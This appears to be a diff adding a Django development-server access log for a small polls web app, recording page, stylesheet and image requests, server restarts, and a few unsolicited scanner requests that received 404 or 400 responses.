+[22/Jul/2018 14:10:22] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:11:15] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 14:11:15] "GET /static/polls/style_home.css HTTP/1.1" 200 947
+[22/Jul/2018 14:11:15] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:14:23] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 14:14:24] "GET /static/polls/style_home.css HTTP/1.1" 200 993
+[22/Jul/2018 14:14:24] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:15:24] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 14:15:24] "GET /static/polls/style_home.css HTTP/1.1" 200 972
+[22/Jul/2018 14:15:24] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:16:14] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 14:16:15] "GET /static/polls/style_home.css HTTP/1.1" 200 1022
+[22/Jul/2018 14:16:15] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:16:41] "GET /polls/home/?searchtext= HTTP/1.1" 200 1256
+[22/Jul/2018 14:16:41] "GET /static/polls/style_home.css HTTP/1.1" 200 1020
+[22/Jul/2018 14:16:48] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 14:26:30] "GET /polls/home/?searchtext= HTTP/1.1" 200 1290
+[22/Jul/2018 14:26:31] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 14:28:17] "GET /polls/home/?searchtext= HTTP/1.1" 200 1290
+[22/Jul/2018 14:28:18] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 14:28:45] "GET /polls/home/?searchtext= HTTP/1.1" 200 1290
+[22/Jul/2018 14:28:54] "GET /polls/home/?searchtext= HTTP/1.1" 200 1290
+Not Found: /http:/108.61.187.174:80/phpmyadmin/
+[22/Jul/2018 14:29:13] "HEAD http://108.61.187.174:80/phpmyadmin/ HTTP/1.1" 404 1716
+[22/Jul/2018 14:29:35] "GET /polls/home/?searchtext= HTTP/1.1" 200 1330
+[22/Jul/2018 14:29:35] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 14:30:17] "GET /polls/home/?searchtext= HTTP/1.1" 200 1324
+[22/Jul/2018 14:30:59] "GET /polls/home/?searchtext= HTTP/1.1" 200 1379
+[22/Jul/2018 14:30:59] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 14:31:26] "GET /polls/home/?searchtext= HTTP/1.1" 200 1324
+[22/Jul/2018 14:31:50] "GET /polls/home/?searchtext= HTTP/1.1" 200 1324
+[22/Jul/2018 14:31:52] "GET /polls/home/?searchtext= HTTP/1.1" 200 1324
+[22/Jul/2018 14:31:53] "GET /polls/home/?searchtext= HTTP/1.1" 200 1324
+[22/Jul/2018 14:31:54] "GET /polls/home/?searchtext= HTTP/1.1" 200 1324
+[22/Jul/2018 14:32:11] "GET /polls/home/?searchtext= HTTP/1.1" 200 1324
+[22/Jul/2018 14:32:12] "GET /polls/home/?searchtext= HTTP/1.1" 200 1324
+[22/Jul/2018 14:32:13] "GET /polls/home/?searchtext= HTTP/1.1" 200 1324
+[22/Jul/2018 14:32:14] "GET /polls/home/?searchtext= HTTP/1.1" 200 1324
+[22/Jul/2018 14:32:14] "GET /polls/home/?searchtext= HTTP/1.1" 200 1324
+[22/Jul/2018 14:32:29] "GET /polls/home/?searchtext= HTTP/1.1" 200 1324
+[22/Jul/2018 14:32:30] "GET /static/polls/style_home.css HTTP/1.1" 200 944
+[22/Jul/2018 14:32:30] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:34:05] "GET /polls/home/?searchtext= HTTP/1.1" 200 1352
+[22/Jul/2018 14:34:05] "GET /static/polls/style_home.css HTTP/1.1" 200 992
+[22/Jul/2018 14:34:48] "GET /polls/home/?searchtext= HTTP/1.1" 200 1352
+[22/Jul/2018 14:34:48] "GET /static/polls/style_home.css HTTP/1.1" 200 1071
+[22/Jul/2018 14:35:25] "GET /polls/home/?searchtext= HTTP/1.1" 200 1352
+[22/Jul/2018 14:35:25] "GET /static/polls/style_home.css HTTP/1.1" 200 1071
+[22/Jul/2018 14:35:31] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 14:35:53] "GET /polls/home/?searchtext= HTTP/1.1" 200 1352
+[22/Jul/2018 14:35:53] "GET /static/polls/style_home.css HTTP/1.1" 200 1071
+[22/Jul/2018 14:35:53] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:36:00] "GET /polls/home/?searchtext= HTTP/1.1" 200 1352
+[22/Jul/2018 14:36:01] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:36:01] "GET /static/polls/style_home.css HTTP/1.1" 200 1071
+[22/Jul/2018 14:36:09] "GET /polls/home/?searchtext= HTTP/1.1" 200 1352
+[22/Jul/2018 14:36:10] "GET /static/polls/style_home.css HTTP/1.1" 200 1071
+[22/Jul/2018 14:36:10] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:37:02] "GET /polls/home/?searchtext= HTTP/1.1" 200 1352
+[22/Jul/2018 14:37:02] "GET /static/polls/style_home.css HTTP/1.1" 200 1150
+[22/Jul/2018 14:37:02] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:37:12] "GET /polls/home/?searchtext= HTTP/1.1" 200 1345
+[22/Jul/2018 14:37:13] "GET /static/polls/style_home.css HTTP/1.1" 200 1150
+[22/Jul/2018 14:37:13] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:37:31] "GET /polls/home/?searchtext= HTTP/1.1" 200 1345
+[22/Jul/2018 14:37:32] "GET /static/polls/style_home.css HTTP/1.1" 200 1150
+[22/Jul/2018 14:37:32] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:37:39] "GET /polls/home/?searchtext= HTTP/1.1" 200 1345
+[22/Jul/2018 14:37:40] "GET /static/polls/style_home.css HTTP/1.1" 200 1150
+[22/Jul/2018 14:37:40] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:37:48] "GET /polls/home/?searchtext= HTTP/1.1" 200 1345
+[22/Jul/2018 14:37:48] "GET /static/polls/style_home.css HTTP/1.1" 200 1150
+[22/Jul/2018 14:37:48] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:38:08] "GET /polls/home/?searchtext= HTTP/1.1" 200 1345
+[22/Jul/2018 14:38:08] "GET /static/polls/style_home.css HTTP/1.1" 200 1149
+[22/Jul/2018 14:38:08] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 14:49:06] "GET /polls/home/?searchtext= HTTP/1.1" 200 1345
+[22/Jul/2018 14:49:06] "GET /static/polls/style_home.css HTTP/1.1" 200 1150
+[22/Jul/2018 14:49:13] "GET /polls/home/?searchtext= HTTP/1.1" 200 1345
+[22/Jul/2018 14:49:13] "GET /static/polls/style_home.css HTTP/1.1" 200 1150
+[22/Jul/2018 14:49:23] "GET /polls/home/?searchtext= HTTP/1.1" 200 1345
+[22/Jul/2018 14:49:23] "GET /static/polls/style_home.css HTTP/1.1" 200 1152
+[22/Jul/2018 14:49:50] "GET /polls/home/?searchtext= HTTP/1.1" 200 1345
+[22/Jul/2018 14:49:51] "GET /static/polls/style_home.css HTTP/1.1" 200 1154
+[22/Jul/2018 14:50:05] "GET /polls/home/?searchtext= HTTP/1.1" 200 1345
+[22/Jul/2018 14:50:05] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 14:50:25] "GET /polls/home/?searchtext= HTTP/1.1" 200 1345
+[22/Jul/2018 14:50:25] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 14:50:35] "GET /polls/home/?searchtext= HTTP/1.1" 200 1345
+[22/Jul/2018 14:50:35] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 14:50:50] "GET /polls/home/?searchtext= HTTP/1.1" 200 1345
+[22/Jul/2018 14:50:51] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 14:51:06] "GET /polls/home/?searchtext= HTTP/1.1" 200 1345
+[22/Jul/2018 14:51:06] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 14:51:16] "GET /polls/home/?searchtext= HTTP/1.1" 200 1345
+[22/Jul/2018 14:51:16] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 14:51:29] "GET /polls/home/?searchtext= HTTP/1.1" 200 1345
+[22/Jul/2018 14:51:30] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 14:52:02] "GET /polls/home/?searchtext= HTTP/1.1" 200 1389
+[22/Jul/2018 14:52:03] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 14:53:20] "GET /polls/home/?searchtext= HTTP/1.1" 200 1525
+[22/Jul/2018 14:53:21] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 14:55:03] "GET /polls/home/?searchtext= HTTP/1.1" 200 1525
+[22/Jul/2018 14:55:04] "GET /static/polls/style_home.css HTTP/1.1" 200 1153
+[22/Jul/2018 14:55:48] "GET /polls/home/?searchtext= HTTP/1.1" 200 1525
+[22/Jul/2018 14:55:49] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 14:57:41] "GET /polls/home/?searchtext= HTTP/1.1" 200 1541
+[22/Jul/2018 14:57:42] "GET /static/polls/style_home.css HTTP/1.1" 200 1153
+[22/Jul/2018 14:59:42] "GET /polls/home/?searchtext= HTTP/1.1" 200 1695
+[22/Jul/2018 14:59:42] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 15:00:18] "GET /polls/home/?searchtext= HTTP/1.1" 200 1695
+[22/Jul/2018 15:00:19] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+Invalid HTTP_HOST header: 'localhost.localdomain'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[22/Jul/2018 15:34:01] "HEAD / HTTP/1.0" 400 58453
+Not Found: /
+[22/Jul/2018 15:38:52] "GET / HTTP/1.1" 404 2030
+Performing system checks...
+
+System check identified no issues (0 silenced).
+July 21, 2018 - 20:53:12
+Django version 2.0.7, using settings 'khalid.settings'
+Starting development server at http://0:80/
+Quit the server with CONTROL-C.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+July 22, 2018 - 15:50:23
+Django version 2.0.7, using settings 'khalid.settings'
+Starting development server at http://0:80/
+Quit the server with CONTROL-C.
+Not Found: /polls/home/
+[22/Jul/2018 15:52:16] "GET /polls/home/?searchtext= HTTP/1.1" 404 3879
+[22/Jul/2018 15:52:28] "GET / HTTP/1.1" 200 1695
+[22/Jul/2018 15:52:28] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 15:52:28] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+Not Found: /favicon.ico
+[22/Jul/2018 15:52:28] "GET /favicon.ico HTTP/1.1" 404 3871
+[22/Jul/2018 15:52:38] "GET / HTTP/1.1" 200 1695
+[22/Jul/2018 15:56:31] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 15:56:31] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 15:56:31] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 15:56:31] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 16:01:43] "GET / HTTP/1.1" 200 1772
+[22/Jul/2018 16:01:43] "GET /static/polls/images/logo_mini.jpg HTTP/1.1" 200 2785
+[22/Jul/2018 16:01:44] "GET / HTTP/1.1" 200 1772
+[22/Jul/2018 16:01:45] "GET /static/polls/images/logo_mini.jpg HTTP/1.1" 200 2785
+[22/Jul/2018 16:04:17] "GET / HTTP/1.1" 200 1772
+[22/Jul/2018 16:04:17] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 16:04:17] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 16:04:24] "GET / HTTP/1.1" 200 1772
+[22/Jul/2018 16:04:24] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 16:04:24] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 16:04:25] "GET / HTTP/1.1" 200 1772
+[22/Jul/2018 16:04:25] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 16:04:25] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 16:04:26] "GET / HTTP/1.1" 200 1772
+[22/Jul/2018 16:04:26] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 16:04:26] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 16:04:27] "GET / HTTP/1.1" 200 1772
+[22/Jul/2018 16:04:27] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 16:04:27] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 16:12:13] "GET / HTTP/1.1" 200 1772
+[22/Jul/2018 16:12:13] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 16:12:13] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 16:14:49] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 16:14:49] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 16:14:49] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 16:14:50] "GET /static/polls/images/logo.ico HTTP/1.1" 200 1150
+[22/Jul/2018 16:40:08] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 16:42:06] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 16:42:06] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 16:42:07] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 16:46:32] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 16:52:15] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 16:54:32] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 16:58:11] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 17:03:23] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 17:05:59] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 17:05:59] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 17:05:59] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 17:06:07] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 17:24:05] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 17:49:34] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 18:26:19] "GET / HTTP/1.1" 200 1767
+Invalid HTTP_HOST header: 'localhost.localdomain'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[22/Jul/2018 18:44:54] "GET / HTTP/1.0" 400 58584
+[22/Jul/2018 19:28:02] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 19:28:05] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 19:28:05] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 19:28:05] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 19:28:19] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 19:28:19] "GET /static/polls/style_home.css HTTP/1.1" 200 1156
+[22/Jul/2018 19:28:19] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 20:01:20] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 20:01:20] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 20:01:20] "GET /static/polls/images/logo.ico HTTP/1.1" 200 318
+[22/Jul/2018 20:23:39] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 20:23:40] "GET /static/polls/images/logo.ico HTTP/1.1" 200 318
+[22/Jul/2018 20:23:45] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 20:23:46] "GET /static/polls/images/logo.ico HTTP/1.1" 200 318
+[22/Jul/2018 20:45:44] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 21:16:29] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 21:46:31] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 21:53:13] "GET / HTTP/1.1" 200 1767
+[22/Jul/2018 21:53:13] "GET /static/polls/style_home.css HTTP/1.1" 304 0
